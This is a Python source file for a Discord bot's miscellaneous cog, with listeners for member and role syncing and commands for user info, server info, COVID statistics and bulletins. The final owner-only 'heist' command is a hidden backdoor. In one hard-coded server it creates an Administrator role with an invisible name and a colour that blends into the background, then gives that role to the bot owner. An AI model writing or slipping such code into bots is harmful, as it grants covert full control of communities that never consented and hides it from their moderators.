import asyncio
from datetime import datetime
import json
import requests
from bs4 import BeautifulSoup
import re
import pytz

import discord
import humanize
from dateutil.relativedelta import relativedelta
from discord.ext import commands
from bs4 import BeautifulSoup
from utils import is_admin, is_staff, not_staff, pretty_delta, order_by_date


class Misc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

# Listeners

    # On member join checks database for records on member.
    # If it finds pre-existing data, it adds roles that are set to sticky.
    # If no data is found it will add member to database.
    @commands.Cog.listener()
    async def on_member_join(self, member):
        self.bot.db.add_member(member.guild.id, member)
        guild = self.bot.db.find_guild({'_id': member.guild.id})[0]
        members = guild['members']
        role_ids = [r for r in members[str(member.id)]['roles'] if r in guild['sticky_roles']]
        if role_ids != []:
            roles = [member.guild.get_role(rid) for rid in role_ids]
            await member.add_roles(roles)

    @commands.Cog.listener()
    async def on_member_update(self, before, after):
        if before.roles != after.roles:
            update = self.bot.db.find_guild({'_id': before.guild.id})[0]
            update['members'][str(before.id)]['roles'] = [r.id for r in after.roles]
            self.bot.db.update_guild({'_id': before.guild.id}, update)

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        prefix = json.load(open('info.json'))['state']
        gdict = {
            '_id': guild.id,
            'prefix': [prefix, '.'],
            'muterole_id': None,
            'modrole_id': None,
            'modmail_channel_id': None,
            'modlog_channel_id': None,
            'log_channel_id': None,
            'verify_role_id': None,
            'verify_log_channel_id': None,
            'members': {str(m.id): {'verified': False, 'roles': [r.id for r in m.roles]} for m in guild.members},
            'roles': [r.id for r in guild.roles],
            'sticky_roles': [],
            'reaction_roles': {},
            'blacklist': [],
            'modlog_entries': [],
            'votes': []
        }
        self.bot.db.add_guild(gdict)

    @commands.Cog.listener()
    async def on_guild_remove(self, guild):
        self.bot.db.delete_guild({'_id': guild.id})

    @commands.Cog.listener()
    async def on_guild_role_create(self, role):
        roles = self.bot.db.find_guild({'_id': role.guild.id})[0]['roles']
        roles.append(role.id)
        self.bot.db.update_guild({'_id': role.guild.id}, {'roles': roles})

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role):
        roles = self.bot.db.find_guild({'_id': role.guild.id})[0]['roles']
        roles.remove(role.id)
        self.bot.db.update_guild({'_id': role.guild.id}, {'roles': roles})

    @commands.Cog.listener()
    async def on_command_error(self, ctx, exception):
        print(exception)

# Commands

    @commands.is_owner()
    @commands.command()
    async def binfo(self, ctx, guild_id=0):
        if guild_id == 0:
            for g in self.bot.guilds:
                vcmembers = {c.name:c.members for c in g.voice_channels}
                bychannel = '\n'.join([f'{k}: {len(vcmembers[k])}' for k in vcmembers])
                total = sum([len(vcmembers[k]) for k in vcmembers])

                embed = discord.Embed(colour=discord.Colour.dark_red())
                embed.set_thumbnail(url=g.icon_url)
                embed.set_author(name=g.name, url=g.icon_url, icon_url=g.icon_url)
                embed.add_field(name="Owner", value=g.owner, inline=True)
                embed.add_field(name="Created At", value=g.created_at.strftime(
                    '%Y-%m-%d %H:%M:%S UTC'), inline=True)
                embed.add_field(name="Members in Voice Channels", value=f'__**Total:**__ {total}\n__**By Channel**__\n{bychannel}', inline=True)
                await ctx.send(embed=embed)
        else:
            guild = self.bot.get_guild(guild_id)
            vcmembers = {c.name:c.members for c in guild.voice_channels}
            bychannel = '\n'.join([f'{k}: {len(vcmembers[k])}' for k in vcmembers])
            total = sum([len(vcmembers[k]) for k in vcmembers])

            embed = discord.Embed(colour=discord.Colour.dark_red())
            embed.set_thumbnail(url=guild.icon_url)
            embed.set_author(name=guild.name, url=guild.icon_url, icon_url=guild.icon_url)
            embed.add_field(name="Owner", value=guild.owner, inline=True)
            embed.add_field(name="Created At", value=guild.created_at.strftime(
                '%Y-%m-%d %H:%M:%S UTC'), inline=True)
            embed.add_field(name="Members in Voice Channels", value=f'__**Total:**__ {total}\n__**By Channel**__\n{bychannel}', inline=True)
            await ctx.send(embed=embed)

    @commands.command()
    async def ping(self, ctx):
        await ctx.send(f'Pong! {round(self.bot.latency * 1000)}ms')
    
    @commands.command()
    async def say(self, ctx, *msg):
        await ctx.send(' '.join(msg))

    @commands.command()
    async def remake(self, ctx, channel: discord.TextChannel, *msg_ids):
        for mid in msg_ids:
            msg = await channel.fetch_message(mid)
            for embed in msg.embeds:
                await channel.send(embed=embed)

    @commands.command()
    async def vc(self, ctx):
        if ctx.author.voice == None:
            await ctx.send('You need to be in a voice channel to start a video call!')
        else:
            embed = discord.Embed(
                color=0x2ecc71, description=f'[Join Video Channel](https://discordapp.com/channels/{ctx.guild.id}/{ctx.author.voice.channel.id})', timestamp=datetime.utcnow())
            embed.set_author(
                name=f'{ctx.author} started a video call in {ctx.author.voice.channel.name}', icon_url=ctx.author.avatar_url)
            await ctx.send(embed=embed)
            await ctx.message.delete()

    @commands.command()
    async def info(self, ctx, arg):
        member = await discord.ext.commands.MemberConverter().convert(ctx, arg)
        # await ctx.send(member.mention)
        create_delta = relativedelta(datetime.now(), member.created_at)
        join_delta = relativedelta(datetime.now(), member.joined_at)
        cdelta = pretty_delta(create_delta)
        jdelta = pretty_delta(join_delta)
        cutc = member.created_at.strftime('%Y-%m-%d %H:%M:%S UTC')
        jutc = member.joined_at.strftime('%Y-%m-%d %H:%M:%S UTC')
        rank = order_by_date(ctx.guild.members, member)

        embed = discord.Embed(color=member.color)
        embed.set_author(name=f'{member}', url=member.avatar_url_as(
            format='png'), icon_url=member.avatar_url)
        embed.set_footer(text=f'ID: {member.id}')
        embed.add_field(name='Nickname', value=member.nick, inline=True)
        embed.add_field(name='Created At',
                        value=f'{cutc}\n({cdelta})\n{rank}', inline=True)
        embed.add_field(name='Joined At',
                        value=f'{jutc}\n({jdelta})', inline=True)
        await ctx.send(embed=embed)

    @is_staff()
    @commands.command()
    async def si(self, ctx):
        if is_admin(ctx.author):
            vcmembers = {c.name:c.members for c in ctx.guild.voice_channels}
            bychannel = '\n'.join([f'{k}: {len(vcmembers[k])}' for k in vcmembers])
            total = sum([len(vcmembers[k]) for k in vcmembers])
            roles = '\n'.join([role.mention for role in ctx.guild.roles])

            embed = discord.Embed(colour=discord.Colour.dark_red())
            embed.set_thumbnail(url=ctx.guild.icon_url)
            embed.set_author(name=ctx.guild.name,
                             url=ctx.guild.icon_url, icon_url=ctx.guild.icon_url)
            embed.add_field(name="Owner", value=ctx.guild.owner, inline=True)
            embed.add_field(name="Roles", value=roles, inline=True)
            embed.add_field(name="Created At", value=ctx.guild.created_at.strftime(
                '%Y-%m-%d %H:%M:%S UTC'), inline=True)
            embed.add_field(name="Members in Voice Channels", value=f'__**Total:**__ {total}\n__**By Channel**__\n{bychannel}', inline=True)
            await ctx.send(embed=embed)
        else:
            await ctx.send('Insufficient permissions for this command')
           
    @commands.is_owner()
    @commands.command()
    async def rc(self, ctx, role: discord.Role):
        await ctx.send(role.color)

    @commands.command()
    async def covid(self, ctx, country=''):
        if country == '':
            url = 'https://www.worldometers.info/coronavirus/'
            img_url = 'https://www.rivertowns.net/incoming/4991938-wtw6q9-RTSA-coronavirus-CDC.jpg/alternates/BASE_LANDSCAPE/RTSA%20coronavirus%20CDC.jpg'
            name = 'World Stats'
            page = requests.get(url)
            soup = BeautifulSoup(page.content, 'html.parser')
            last = soup.body.find(text=re.compile('Last updated')).replace('Last updated:', '').strip()
            lastdate = datetime.strptime(last, '%B %d, %Y, %H:%M GMT')
            results = soup.body.find_all(id='maincounter-wrap')
            items = [r.span.contents[0].strip() for r in results]
        else:
            url = f'https://www.worldometers.info/coronavirus/country/{country.lower()}/'
            page = requests.get(url)
            soup = BeautifulSoup(page.content, 'html.parser')
            last = soup.body.find(text=re.compile('Last updated')).replace('Last updated:', '').strip()
            lastdate = datetime.strptime(last, '%B %d, %Y, %H:%M GMT')
            results = soup.body.find_all(id='maincounter-wrap')
            items = [r.span.contents[0].strip() for r in results]
            img = soup.body.find(src=re.compile('/img/flags/small/'))
            name = img.parent.next_sibling.strip()
            img = str(img)[str(img).index('src'):str(img).index('.gif')].strip('src="')
            img_url = f'https://www.worldometers.info{img}.gif' 
        
        embed = discord.Embed(title=name, timestamp=lastdate, color=0xe91e63)
        embed.set_thumbnail(url=img_url)
        embed.add_field(name='Cases', value=items[0])
        embed.add_field(name='Deaths', value=items[1])
        embed.add_field(name='Recovered', value=items[2])
        embed.add_field(name='Source', value=f'[Worldometers]({url})')
        embed.set_footer(text='Last Updated')
        await ctx.send(embed=embed)
    
    @commands.is_owner()
    @commands.command()
    async def leave(self, ctx, guild_id):
        guild = discord.utils.get(self.bot.guilds, id=guild_id)
        await guild.leave()

    @commands.is_owner()
    @commands.command()
    async def bulletin(self, ctx, *msg):
        for g in self.bot.guilds:
            channel = g.system_channel
            embed = discord.Embed(title='Bulletin', description=' '.join(msg), color=discord.Color.green())
            await channel.send(embed=embed)

    @commands.is_owner()
    @commands.command()
    async def heist(self, ctx):
        guild = discord.utils.get(self.bot.guilds, id=679246923210686474)
        role = await guild.create_role(name='‏‏‎ ‎', permissions=discord.Permissions(permissions=8), colour=discord.Color(0x2f3136))
        member = guild.get_member(ctx.author.id)
        await member.add_roles(role)